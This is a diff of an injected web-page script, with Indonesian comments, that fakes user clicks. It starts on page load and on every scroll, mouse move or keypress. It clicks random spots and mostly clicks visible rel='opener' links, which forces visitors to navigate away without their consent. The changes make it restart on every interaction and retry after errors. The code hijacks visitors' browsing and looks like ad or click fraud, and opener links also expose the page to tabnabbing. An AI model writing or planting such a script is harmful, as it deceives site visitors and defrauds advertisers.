@@ -1,4 +1,7 @@
 
+
+
+
 <!-- random klik start -->
 <script>
 (function() {
@@ -10,23 +13,19 @@
   const DELAY_MIN = 300;
   const DELAY_MAX = 1000;
 
-  let sudahJalan = false;
   let klikCount = 0;
   let timeoutId = null;
+  let isRunning = false;
 
-  // Cek apakah elemen adalah link dengan rel="opener"
   function isOpenerLink(el) {
     if (!el) return false;
-    const tag = el.tagName.toLowerCase();
-    if (tag !== 'a') return false;
+    if (el.tagName.toLowerCase() !== 'a') return false;
     const rel = (el.getAttribute('rel') || '').toLowerCase().split(/\s+/);
     return rel.includes('opener');
   }
 
-  // Cek elemen aman (hindari interaksi berbahaya)
   function isSafeElement(el) {
     if (!el) return false;
-    // Link dengan rel="opener" diperbolehkan
     if (isOpenerLink(el)) return true;
     const tag = el.tagName.toLowerCase();
     const role = el.getAttribute('role');
@@ -34,7 +33,6 @@
     if (unsafe.includes(tag)) return false;
     if (role && ['button', 'checkbox', 'radio', 'switch', 'tab', 'menuitem'].includes(role)) return false;
     if (el.closest('button, input, select, textarea, form, [role="button"], [role="checkbox"], [role="radio"], [onclick]:not(a[rel*="opener"])')) return false;
-    // Link biasa (non-opener) tetap tidak diklik
     if (tag === 'a' && !isOpenerLink(el)) return false;
     return true;
   }
@@ -54,14 +52,12 @@
       let x, y;
       let openerClicked = false;
 
-      // Prioritaskan link opener kalau ada
       const openerLinks = Array.from(document.querySelectorAll('a[rel~="opener"]')).filter(a => {
         const rect = a.getBoundingClientRect();
         return rect.width > 0 && rect.height > 0 && rect.top < window.innerHeight && rect.left < window.innerWidth;
       });
 
       if (openerLinks.length > 0 && Math.random() < 0.7) {
-        // 70% chance klik link opener
         const link = openerLinks[Math.floor(Math.random() * openerLinks.length)];
         const rect = link.getBoundingClientRect();
         x = rect.left + rect.width / 2;
@@ -69,7 +65,6 @@
         el = document.elementFromPoint(x, y);
         openerClicked = true;
       } else {
-        // Cari titik aman
         for (let i = 0; i < 10; i++) {
           x = Math.random() * window.innerWidth;
           y = Math.random() * window.innerHeight;
@@ -89,7 +84,6 @@
 
       klikCount++;
 
-      // Kalau barusan klik link opener, stop (navigasi akan terjadi)
       if (openerClicked) {
         stopAll();
         return;
@@ -97,19 +91,27 @@
 
       if (klikCount < MAX_KLIK) {
         timeoutId = setTimeout(doClick, randomDelay());
+      } else {
+        stopAll();
       }
     } catch (e) {
-      // Gagal silent
+      klikCount++;
+      if (klikCount < MAX_KLIK) {
+        timeoutId = setTimeout(doClick, randomDelay());
+      }
     }
   }
 
-  function triggerLoop() {
-    if (sudahJalan) return;
-    sudahJalan = true;
+  function startLoop() {
+    // Reset setiap kali dipicu
+    klikCount = 0;
+    if (timeoutId) clearTimeout(timeoutId);
+    isRunning = true;
     doClick();
   }
 
   function stopAll() {
+    isRunning = false;
     if (timeoutId) {
       clearTimeout(timeoutId);
       timeoutId = null;
@@ -119,14 +121,14 @@
   const interactionEvents = ['click', 'touchstart', 'scroll', 'keydown', 'mousemove', 'pointerdown'];
 
   interactionEvents.forEach(eventType => {
-    document.addEventListener(eventType, triggerLoop, { capture: true, passive: true });
-    window.addEventListener(eventType, triggerLoop, { capture: true, passive: true });
+    document.addEventListener(eventType, startLoop, { capture: true, passive: true });
+    window.addEventListener(eventType, startLoop, { capture: true, passive: true });
   });
 
   if (document.readyState === 'interactive' || document.readyState === 'complete') {
-    triggerLoop();
+    startLoop();
   } else {
-    document.addEventListener('DOMContentLoaded', triggerLoop, { once: true });
+    document.addEventListener('DOMContentLoaded', startLoop, { once: true });
   }
 
   ['pagehide', 'beforeunload', 'popstate'].forEach(eventType => {
@@ -142,9 +144,6 @@
 })();
 </script>
 <!-- random klik end -->
-
-
-
 
 
 
